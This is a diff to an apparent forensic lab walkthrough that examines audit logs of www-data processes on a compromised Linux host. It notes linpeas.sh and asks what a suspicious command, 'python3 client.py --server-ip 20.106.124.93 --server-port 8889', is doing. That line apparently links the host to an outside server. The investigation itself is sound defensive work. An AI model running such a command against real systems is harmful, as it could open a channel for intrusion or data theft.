@@ -216,6 +216,7 @@ ausearch --input audit.log -ui 33 -i | grep -oP proctitle=.* | sort | uniq -c | 
 ```bash
 gedit all-www-data-processes.txt &
 ```
+
 At the Top: uncommon commands prefixed with a `1` (e.g., `linpeas.sh`)*
 
 ![gedit](screenshots/gedit_all_www_data.png)
@@ -223,7 +224,8 @@ At the Top: uncommon commands prefixed with a `1` (e.g., `linpeas.sh`)*
 
 At the Bottom: frequent commands (e.g., `client.py`, `python3`)
 
-![gedit](screenshots/gedit_all_www_data.png)
+![gedit](screenshots/gedit_all_www_data2.png)
+>❓ *what is this Python Command `python3 client.py --server-ip 20.106.124.93 --server-port 8889` Doing?*
 
 ---
 
